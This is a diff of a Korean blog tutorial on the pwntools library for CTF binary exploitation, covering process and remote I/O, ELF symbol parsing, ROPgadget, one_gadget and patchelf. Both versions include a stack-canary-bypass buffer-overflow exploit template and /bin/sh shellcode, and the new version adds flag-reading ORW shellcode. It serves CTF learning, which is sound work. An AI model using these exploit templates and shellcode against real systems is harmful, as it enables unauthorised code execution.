@@ -1,260 +1,230 @@
 ---
-title: "Pwntools 라이브러리를 활용한 시스템 취약점 익스플로잇 자동화 스크립트 작성법"
-description: "파이썬 Pwntools 모듈의 로컬/원격 프로세스 I/O 통신, 페이로드 패킹(p64/u64), ELF 바이너리 심볼 파싱 및 대화형 쉘 획득 기법을 정리합니다."
+title: "Pwntools 기초 및 활용법: 바이너리 익스플로잇 자동화, ROPgadget, one_gadget 가이드"
+description: "시스템 해킹 및 CTF 취약점 익스플로잇 작성을 위한 파이썬 Pwntools 라이브러리의 설치부터 로컬·원격 프로세스 I/O 제어, ELF 심볼 분석, ROPgadget과 one_gadget을 활용한 페이로드 자동화 기법을 총정리합니다."
 slug: "pwntools-python-exploit-scripting-guide"
 date: 2024-03-09T10:09:44+09:00
 lastmod: 2026-10-18T18:00:00+09:00
 draft: false
 categories: ["Security"]
-tags: ["pwntools", "python", "system-hacking", "exploit", "security"]
+tags: ["pwntools", "python", "system-hacking", "exploit", "security", "pwnable"]
 ShowToc: true
 TocOpen: true
 ---
 
-# pwntool
-- 시스템 해킹을 위해 제작된 파이썬 라이브러리
-- 바이너리를 실행하고 특정 input을 집어넣어 해킹(exploit)을 할수 있게 한다.
+# Pwntools 기초 및 활용 가이드
 
-## 설치
-- 리눅스의 apt와 파이썬의 pip 명령으로 설치가 가능하다.
+## Pwntools 개요 및 개발 환경 구축
+Pwntools는 시스템 해킹(Pwnable) 및 CTF 문제 풀이, 익스플로잇 작성을 고속 자동화하기 위해 개발된 파이썬 프레임워크입니다. 소켓 통신, 프로세스 핸들링, ELF 파일 파싱, 어셈블/디스어셈블 등의 기능을 통합 제공합니다.
+
+### 설치 방법 (APT 및 Pip)
+우분투 리눅스 환경에서 다음 패키지들을 설치한 후 pip를 통해 최신 버전을 설치합니다.
+
+```bash
+sudo apt-get update
+sudo apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools
 ```
-$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
-$ python3 -m pip install --upgrade pip
-$ python3 -m pip install --upgrade pwntools
+
+### Dockerfile 기반 격리 환경 구성
+호스트 시스템의 libc 버전과 상관없이 일관된 분석 환경을 유지하기 위해 도커(Docker) 컨테이너를 구성할 수 있습니다.
+
+```dockerfile
+FROM ubuntu:18.04
+
+ENV PATH="${PATH}:/usr/local/lib/python3.6/dist-packages/bin"
+ENV LC_CTYPE=C.UTF-8
+
+RUN apt update && apt install -y \
+    gcc git python3 python3-pip ruby sudo tmux vim wget
+
+# pwndbg 설치
+WORKDIR /root
+RUN git clone https://github.com/pwndbg/pwndbg && \
+    cd pwndbg && git checkout 2023.03.19 && ./setup.sh
+
+# pwntools 및 one_gadget 설치
+RUN pip3 install --upgrade pip && pip3 install pwntools
+RUN gem install one_gadget
+
+WORKDIR /root
 ```
-- [공식 메뉴얼](https://docs.pwntools.com/en/latest/)
-- docker를 사용한 설치 방법
-   ```
-   FROM ubuntu:18.04
 
-   ENV PATH="${PATH}:/usr/local/lib/python3.6/dist-packages/bin"
-   ENV LC_CTYPE=C.UTF-8
+### pwndbg 모듈 초기화 에러 해결
+GDB 구동 시 `partially initialized module 'pwndbg' has no attribute 'lib'` 오류가 발생하는 경우, 로케일 인코딩 설정이 누락된 것이 원인입니다. 쉘 환경에 다음 환경 변수를 추가합니다.
+```bash
+export LANG=C.UTF-8
+```
 
-   RUN apt update
-   RUN apt install -y \
-      gcc \
-      git \
-      python3 \
-      python3-pip \
-      ruby \
-      sudo \
-      tmux \
-      vim \
-      wget
+## 기본 사용법과 입출력 제어
+파이썬 스크립트 상단에서 `from pwn import *`를 선언하여 모든 모듈을 로드합니다.
 
-   # install pwndbg
-   WORKDIR /root
-   RUN git clone https://github.com/pwndbg/pwndbg
-   WORKDIR /root/pwndbg
-   RUN git checkout 2023.03.19
-   RUN ./setup.sh
+### 프로세스 및 원격 연결 (process / remote)
+- 로컬 프로세스 실행:
+  ```python
+  # 로컬 바이너리 실행
+  target = process('./vuln_binary')
 
-   # install pwntools
-   RUN pip3 install --upgrade pip
-   RUN pip3 install pwntools
+  # 특정 libc 파일을 강제 로드(LD_PRELOAD)하여 실행
+  target = process('./vuln_binary', env={"LD_PRELOAD": "./libc.so.6"})
+  ```
+- 원격 서버 소켓 연결:
+  ```python
+  target = remote('ctf.example.com', 1337)
+  ```
 
-   # install one_gadget command
-   RUN gem install one_gadget
+### 데이터 송수신 (send / recv)
+- 송신 메서드:
+  - `target.send(b'payload')`: 바이너리 바이트 스트림 주입
+  - `target.sendline(b'payload')`: 페이로드 뒤에 `\n` 개행 문자를 덧붙여 전송
+  - `target.sendafter(b'Input: ', b'payload')`: 특정 프롬프트 문자열이 수신될 때까지 대기 후 페이로드 전송
+  - `target.sendlineafter(b'Input: ', b'payload')`: 프롬프트 대기 후 개행 포함 전송
+- 수신 메서드:
+  - `data = target.recv(1024)`: 최대 1024바이트 수신
+  - `data = target.recvn(8)`: 정확히 8바이트가 수신될 때까지 대기
+  - `line = target.recvline()`: 개행 문자(`\n`)까지 한 줄 수신
+  - `data = target.recvuntil(b'> ')`: 특정 마커 문자열이 나올 때까지 수신
+  - `data = target.recvall()`: 프로세스가 종료될 때까지 전체 출력 수신
 
-   WORKDIR /root
-   ```
+### 데이터 패킹 및 언패킹 (p64, u64)
+리눅스 x86-64 시스템의 리틀 엔디안(Little-Endian) 바이트 순서 변환을 수행합니다.
+- 패킹 (정수 주소 -> 바이트 스트림):
+  - `p32(0x08048000)`: 32비트 4바이트 리틀 엔디안 변환
+  - `p64(0x7ffff7a00000)`: 64비트 8바이트 리틀 엔디안 변환
+- 언패킹 (바이트 스트림 -> 정수 주소):
+  - `u32(raw_bytes)`: 4바이트 스트림을 정수로 복원
+  - `u64(raw_bytes.ljust(8, b'\x00'))`: 6바이트 등 불완전한 메모리 유출 값을 8바이트로 맞춘 후 정수로 복원
 
-### 에러 발생시 해결
-- `partially initialized module 'pwndbg' has no attribute 'lib'` 에러 발생시에는 쉘 명령어에 `export LANG=C.UTF-8` 를 입력한다.
+### 어셈블 및 디스어셈블 (asm / disasm)
+- 어셈블: 어셈블리 텍스트를 기계어 바이트코드로 변환합니다.
+  ```python
+  context.arch = 'amd64'
+  code = asm('mov rax, 0x3b; syscall')
+  ```
+- 디스어셈블: 기계어 바이트를 어셈블리 텍스트로 복원합니다.
+  ```python
+  print(disasm(b'\xb8\x3b\x00\x00\x00\x0f\x05'))
+  ```
 
-## 사용법
-- `from pwn import *` 을 통해 모듈을 로딩한다.
+### 대화형 쉘 획득 (interactive)
+익스플로잇 성공 후 사용자가 터미널을 통해 획득한 쉘 권한과 직접 상호작용할 수 있도록 제어권을 사용자 표준 입출력으로 넘깁니다.
+```python
+target.interactive()
+```
 
-### 실행
-1. process / remote
-   - `target = process(파일경로)`
-     - 로컬 파일을 exploit 하기위한 대상으로 설정한다. 
-     - `env` 인자를 추가하여 프로그램 동작시 적용될 환경변수를 설정할 수 있다.
-       - 다음은 libc 파일을 원하는 경로에서 링킹 하도록 설정하는 구문이다. :  `target = process('./a.out', env= {"LD_PRELOAD" : "./libc.so.6"})`
-  - `target = remote('목적지 ip', 목적지 port)` 
-    - ip:port 에 연결된 소켓을 exploit target으로 설정한다.
-    - 원격으로 접속한 목적지의 파일을 exploit 할 때 사용한다.
-  
-### 데이터 송수신
-1. send
-   - `target.send(b'data_to_send')`
-     - `process` 혹은 `remote` 로 설정한 target 에 표준입력을 주입하는 함수
-     - `b''` 형태의 byte literal 을 전달해야 한다. `p64` 혹은 `p32` 로 변환하여 전달 할 수도 있다.
-     - send의 파생으로 sendline, sendafter, sendlineafter 등이 있다. 
-       - `target.sendline(b'data')` : 'data' 전달 후 '\n' 추가 입력
-       - `target.sendlineafter(b'input:', b'data')` : 출력으로 'input:'가 감지되면 target에 'data'를 입력
-2. recv
-   - target으로 부터 들어오는 출력 데이터를 수신하는 함수. return 값은 byte literal 이므로 `u64` 혹은 `u32` 로 변환 후 사용한다.
-   - `result = target.recv(len)`: len만큼 데이터를 수신, len보다 길이가 짧으면 오류 반환
-   - 파생으로 recvn, recvline, recvuntil, recvall 이 있다.
-     - `result = target.recvn(5)`: 5byte 데이터를 수신, 수신한 길이가 len보다 짧으면 무한 대기
-     - `result = target.recvline()`: 개행문자를 만날 때 까지 데이터 수신
-     - `result = target.recvuntil('name: ')`: "name: " 문자를 만날 때 까지 데이터 수신 (인자로 b'name', 'name' 모두 되는듯)
-     - `result = target.recvall()`: 프로세스가 종료될 때 까지 데이터 수신
+## 바이너리 분석 및 디버깅 연동
 
-3. packing / unpacking
-   - 데이터를 변환하는 함수
-   - `p32(VALUE)` : 32bit little endian으로 변환
-   - `p64(VALUE)` : 64bit little endian으로 변환
-   - `u32(VALUE)` : 32bit big endian으로 변환
-   - `u64(VALUE)` : 64bit big endian으로 변환
+### ELF 심볼 및 PLT/GOT 분석
+`ELF` 클래스를 통해 타깃 바이너리 및 라이브러리의 심볼과 테이블 주소를 파싱할 수 있습니다.
+```python
+elf = ELF('./vuln_binary')
+libc = ELF('./libc.so.6')
 
-4. interactive
-   - exploint 중 표준 입력/출력으로 프로세스에 직접 입력을 주입하고 출력을 확인하고 싶은 경우
-   - `target.interactive()` 를 설정하면 'target' 에 직접 관여할 수 있다.
-5. asm
-   - `asm(CODE)` 형태로 CODE에 어셈블리 라인을 string 형태로 기입시 바이너리 코드를 반환한다.
-   - ex) `asm('mov eax, SYS_execve')` => `b'\xb8\x0b\x00\x00\x00'`
-6. disasm
-   - `disasm(BIN)` 형태로 BIN에 바이너리 데이터를 입력시 어셈블리 명령어를 반환한다. 
-   - ex) `disasm(b'\xb8\x0b\x00\x00\x00')` => `0:   b8 0b 00 00 00          mov    eax, 0xb'`
+# PLT 및 GOT 주소 추출
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
 
-### 실행파일 분석
-1. ELF
-   - ELF 파일 헤더를 참조할 때 사용 가능
-   - `elf = ELF(파일명)` 형태로 참조하면 dictionary 형태의 데이터를 반환 받을 수 있다.
-   - `elf.symbols[함수명]`: 'elf' 가 라이브러리 파일일 때, 라이브러리 함수의 `offset` 을 확인할 수 있다.
-     - `elf.symbols[변수명]`: 'elf' 가 실행프로그램일 때, 변수의 `주소`를 확인할 수 있다.
-   - `elf.plt[함수명]`: 'elf' 가 실행프로그램일 때, plt 테이블에서 함수가 매핑된 `주소`를 확인할 수 있다.
-   - `elf.got[함수명]` 'elf' 가 실행프로그램일 때, got 테이블에서 함수가 매핑된 `주소`를 확인할 수 있다.
-   - `elf.search[문자열]` 으로 ELF 에 저장된 문자열의 주소를 확인한다. 
-2. context
-   - context.log_level
-     - `context.log_level` 을 설정하여 디버깅을 위한 로그 레벨을 설정 할 수 있다.
-   - context.arch
-     - exploit 대상의 아키텍처에 대한 정보를 설정할 수 있다. 
-     - `context.arch = "amd64"` 형태로 설정
-     - `i386`, `arm`, `mips` 등을 설정 할 수 있다.
+# 바이너리 내 전역 변수 및 함수 주소
+target_buf = elf.symbols['target_buf']
 
-### 디버깅
-1. pause
-   - `pause()` 함수를 호출하여 진행상황을 일시 정지 할 수 있다. gdb 로 디버깅을 하기 위해 주로 사용한다.
-     - gdb 명령어 중 `gdb attach -p {PROCESS_ID}` 를 참조하여 디버깅이 가능하다.
-2. gdb.attach()
-   - `target = process(파일경로)` 로 프로그램을 실행시켰다면 `gdb.attach(target)` 명령으로 gdb를 연동시킬 수 있다.
+# 라이브러리 내 함수 상대 오프셋
+system_offset = libc.symbols['system']
 
+# 라이브러리 내 문자열 오프셋 검색
+binsh_offset = next(libc.search(b'/bin/sh'))
+```
 
-### 예시
-1. stack frame안의 버퍼와 canary를 획득한 경우, 버퍼에 shell 실행 코드를 주입하고 stack overflow로 return code를 버퍼의 주소로 변경한 후 canary를 복원시키면 쉘을 획득할 수 있다.
+### Context 환경 설정
+아키텍처, 엔디안, 로그 레벨 등을 전역 설정합니다.
+```python
+context.arch = 'amd64'           # 'i386', 'arm', 'aarch64'
+context.endian = 'little'
+context.log_level = 'debug'      # 송수신되는 모든 입출력 패킷 로깅
+```
 
-   ```
-   from pwn import *
-   target = process(TARGET_PROGRAM)
-   # 'canary' 는 추출해온 스택 카나리 값이 littel endian형태로 담겨있다.
-   shell_code = asm(shellcraft.sh())  # pwn tool로 쉘 실행코드 생성 및 바이너리로 변환
-   payload = shell_code.ljust(buffer_to_canary, b'A') + canary + b'B' * 0x8 + p64(buffer_address) # 버퍼에 쉘 코드를 넣고, 남는 칸은 아무 문자로 메꾼다. 그 후 카나리를 잘 복원하고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀
-   # gets() receives input until '\n' is received
-   target.sendlineafter(b'Input:', payload) # 타겟 프로그램에서 Input을 받아 'buffer_address' 주소에 받도록 프로그램이 짜여져 있다.
+### GDB 디버거 연동 (gdb.attach)
+익스플로잇 스크립트 실행 도중 GDB를 자식 프로세스에 붙여 메모리 상태를 점검할 수 있습니다.
+```python
+p = process('./vuln_binary')
 
-   target.interactive() # 쉘을 획득하고 쉘을 유저가 활용할 수 있게 반환한다.
-   ```
+# GDB 연결 및 브레이크포인트 설정
+gdb.attach(p, '''
+    b *main+0x40
+    c
+''')
+pause() # 프로세스를 일시 정지하여 수동 점검 가능
+```
 
-## 기타 도구
-### checksec
-- pwntool과 함께 설치되는 도구로, 바이너리에 적용되는 보호 기법(ex: RELRO, Canary, NX, PIE) 을 확인할 수 있다.
-  - ASLR은 리눅스에서 기본적으로 적용되어있으므로, 특별한 언급이 없다면 default on이라 생각하면 된다.
-- ex)
-   ```
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-    RWX:      Has RWX segments
-   ```
+### 카나리 우회 익스플로잇 예제
+스택 카나리가 적용된 바이너리에서 버퍼 오버플로우를 통해 카나리를 보존하면서 리턴 주소를 덮어쓰는 전형적인 익스플로잇 구조입니다.
 
+```python
+from pwn import *
 
-### shellcraft
-- pwntool과 함께 설치되는 파이썬 모듈로 쉘 코드의 함수들을 반환한다.
-- [시스템 콜 테이블 참조](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
-  - shellcraft.sh() : 쉘 실행 코드
-  - shellcraft.open() : 쉘 코드 open(인자 필요)
-  - shellcraft.read() : 쉘 코드 read(인자 필요)
-  - shellcraft.write() : 쉘 코드 write(인자 필요)
-  - shellcraft.exit() : 쉘 코드 exit
-- asm() 함수와 함께 조합하면 쉘코드를 바이너리로 만들어 프로그램에 주입할 수 있다.
-  - ex) shellcraft.sh() : 
-      ```
-      /* execve(path='/bin///sh', argv=['sh'], envp=0) */
-      /* push b'/bin///sh\x00' */
-      push 0x68
-      push 0x732f2f2f
-      push 0x6e69622f
-      mov ebx, esp
-      /* push argument array ['sh\x00'] */
-      /* push 'sh\x00\x00' */
-      push 0x1010101
-      xor dword ptr [esp], 0x1016972
-      xor ecx, ecx
-      push ecx /* null terminate */
-      push 4
-      pop ecx
-      add ecx, esp
-      push ecx /* 'sh\x00' */
-      mov ecx, esp
-      xor edx, edx
-      /* call execve() */
-      push SYS_execve /* 0xb */
-      pop eax
-      int 0x80
-      ```
-  - ex) asm(shellcraft.sh()) : `b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'`
+context.arch = 'amd64'
+p = process('./vuln_binary')
 
-### ROPgadget
-- 바이너리에서 gadget 값들을 확인할 수 있는 툴이다.
-- gadget들의 주소를 확인하여 exploit에 활용할 수 있다.
-- `ROPgadget --binary FILE_NAME` 을 입력하면 FILE_NAME 에서 gadget들을 찾아 출력 해 준다.
-  - ex) ROPgadget --binary /bin/bash 의 일부이다.
-   ```
-   0x000000000008b4fb : xor r9d, r9d ; jmp 0x8b46b
-   0x00000000000c0e30 : xor r9d, r9d ; jmp 0xc0c50
-   0x00000000000c7caa : xor r9d, r9d ; jmp 0xc7cb3
-   0x00000000000cc0ed : xor r9d, r9d ; jmp 0xcb089
-   0x000000000007f2a5 : xor r9d, r9d ; lea eax, [rdx + 1] ; jmp 0x7ef68
-   0x000000000006dc63 : xor r9d, r9d ; mov dword ptr [rbx], eax ; jmp 0x6cfd8
-   0x00000000000618ec : xor r9d, r9d ; movsxd rax, r14d ; jmp 0x61792
-   0x000000000006d9b4 : xor r9d, r9d ; xor r13d, r13d ; mov dword ptr [rbx], eax ; jmp 0x6cfd8
-   0x00000000000757b3 : xor rax, qword ptr [r8] ; add byte ptr [rdi + 2], bh ; jmp 0x78b80
-   0x00000000000558c2 : xor rax, rax ; test r13, r13 ; jne 0x558e4 ; jmp 0x558f1
-   ```
-- `--re REGULAR_EXPRESSION` 옵션을 넣어 정규 표현식으로 결과를 필터링 할 수 있다. (|grep 한 것과 유사한 효과)
-  - ex) ROPgadget --binary /bin/bash --re "pop rdi" 의 결과 일부
-      ```
-      0x00000000000c5ac8 : pop rdi ; jmp rax
-      0x00000000000b9c04 : pop rdi ; jne 0xb9c42 ; jmp 0xb9ce1
-      0x00000000000bfc3a : pop rdi ; jne 0xbf8c3 ; jmp 0xbf8cb
-      0x000000000005ca25 : pop rdi ; jns 0x5ca34 ; add al, ch ; jb 0x5c9f0 ; add dword ptr [rax], eax ; jmp 0x5c77f
-      0x000000000005cadd : pop rdi ; or al, 0 ; mov rdx, qword ptr [rax + rcx] ; jmp 0x5c6c0
-      0x000000000005cffc : pop rdi ; or al, 0 ; xor ebx, ebx ; xor ebp, ebp ; jmp 0x5d014
-      0x000000000007542d : pop rdi ; out dx, eax ; or al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x752f8
-      0x00000000000a69fc : pop rdi ; pop r8 ; jmp 0xa5ca0
-      0x00000000000665ca : pop rdi ; pop rbp ; ret
-      0x0000000000030934 : pop rdi ; ret
-      0x00000000000aca60 : pop rdi ; sete dl ; or eax, edx ; movzx ebp, al ; jmp 0xac482
-      0x00000000000ba113 : pop rdi ; sete sil ; or edx, esi ; jmp 0xb9eda
-      0x00000000000b5690 : pop rdi ; xor ecx, ecx ; jmp 0xb56be
-      0x00000000000493b2 : pop rsi ; pop rdi ; jmp 0x48b7d
-      0x00000000000a6ca9 : pop rsi ; pop rdi ; jmp 0xa5ca0
-      0x0000000000070836 : push rsi ; pop rdi ; add al, 0 ; jmp 0x705f1
-      0x0000000000073205 : shr al, 5 ; pop rdi ; add dword ptr [rax], eax ; mov r13, rax ; jmp 0x72db8
-      0x00000000000707e1 : stosd dword ptr [rdi], eax ; pop rdi ; add al, 0 ; jmp 0x7043d
-      ```
+buf_size = 0x40
 
-### One_gadget
-- exploit 에 필요한 `gadget` 들을 일일이 찾거나, `objdump`, `readelf` 등으로 매번 함수들을 찾지 않고 명령어 한 번으로 libc 라이브러리에서 execve("/bin/sh") 를 실행 시킬 수 있도록 하는 gadget 을 알려주는 툴이다.
-- 다음 명령어로 설치가 가능하다.
-   ```
-   sudo apt-get install ruby
-   sudo gem install one_gadget
-   ```
+# 1. 쉘코드 생성
+shellcode = asm(shellcraft.sh())
 
-### Patchelf
-- 바이너리가 동적 라이브러리를 참조하는 경로를 변경할 수 있는 툴이다.
-- `apt-get install patchelf` 명령어로 설치가 가능하다.
-  - [Github 코드](https://github.com/NixOS/patchelf)
-- `patchelf --set-interpreter 라이브러리 실행파일` : '실행파일' 실행시 '라이브러리' 파일을 동적링크로 적용하도록 세팅한다.
-  - `gdb 실행파일` 명령으로 gdb를 실행한 후, `vmmap` 명령으로 메모리 레이아웃을 확인했을 때, 위에서 지정한 '라이브러리' 파일이 표시되면 정상 적용 된 것
-- `patchelf --replace-needed {원본_라이브러리} {대체_라이브러리} {실행파일}` 명령으로 이미 주입된 라이브러리 의존성을 변경 가능하다.
+# 2. 카나리 릭 및 버퍼 주소 수집
+p.recvuntil(b'Buffer: ')
+buf_addr = int(p.recvline(), 16)
 
-- 만약 patchelf 를 적용한 이후 실행 파일 실행 시 permission denied 오류가 발생한다면, 라이브러리에 실행 권한이 적용되어있는지 확인 해 본다.
-  - `chmod a+x {라이브러리_파일}` 명령으로 실행 권한 추가가 필요하다.
+# 3. 카나리를 유출하고 페이로드 빌드
+payload = shellcode.ljust(buf_size, b'A')
+payload += p64(canary_value)       # 카나리 정상 복원
+payload += b'B' * 8                # Saved RBP (SFP) 더미
+payload += p64(buf_addr)           # 리턴 주소를 쉘코드가 위치한 버퍼로 덮어쓰기
+
+p.sendlineafter(b'Input: ', payload)
+p.interactive()
+```
+
+## 보조 익스플로잇 도구 활용
+
+### checksec 보안 기법 점검
+바이너리에 컴파일 타임에 적용된 보호 기법 현황을 확인합니다.
+- `Arch`: 아키텍처 및 비트수
+- `RELRO`: No / Partial / Full RELRO (.got 보호 수준)
+- `Stack`: Canary 적용 여부
+- `NX`: 스택/힙 메모리 실행 권한 차단 여부 (No-Execute)
+- `PIE`: Position Independent Executable (코드 영역 무작위 배치 여부)
+
+### shellcraft 쉘코드 생성
+사전 정의된 검증된 시스템 콜 쉘코드를 손쉽게 생성할 수 있습니다.
+```python
+# /bin/sh 실행 쉘코드
+sc = asm(shellcraft.sh())
+
+# 파일 읽기 ORW 쉘코드
+sc_orw = asm(shellcraft.open('flag.txt') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100))
+```
+
+### ROPgadget 리턴 가젯 추출
+ROP 체인 구성을 위해 바이너리에서 `ret`로 끝나는 유용한 명령어 조각(Gadget)을 탐색합니다.
+```bash
+# rdi 레지스터를 세팅하는 가젯 탐색
+ROPgadget --binary ./vuln_binary --re "pop rdi"
+
+# 스택 16바이트 정렬을 위한 단순 ret 가젯 탐색
+ROPgadget --binary ./vuln_binary --re "ret"
+```
+
+### one_gadget 원샷 가젯 탐색
+glibc 라이브러리 내부에서 특정 레지스터 조건만 만족하면 단 한 번의 호출로 `execve("/bin/sh", NULL, NULL)`을 실행시키는 가젯 오프셋을 자동 탐색합니다.
+```bash
+one_gadget /lib/x86_64-linux-gnu/libc.so.6
+```
+
+### patchelf 라이브러리 의존성 패치
+로컬 환경과 다른 특정 버전의 `libc.so.6` 및 동적 링커(`ld-linux-x86-64.so.2`)를 타깃 바이너리에 강제 바인딩할 때 사용합니다.
+```bash
+# 동적 링커(인터프리터) 경로 변경
+patchelf --set-interpreter ./ld-2.27.so ./vuln_binary
+
+# 의존 공유 라이브러리 교체
+patchelf --replace-needed libc.so.6 ./libc-2.27.so ./vuln_binary
+```
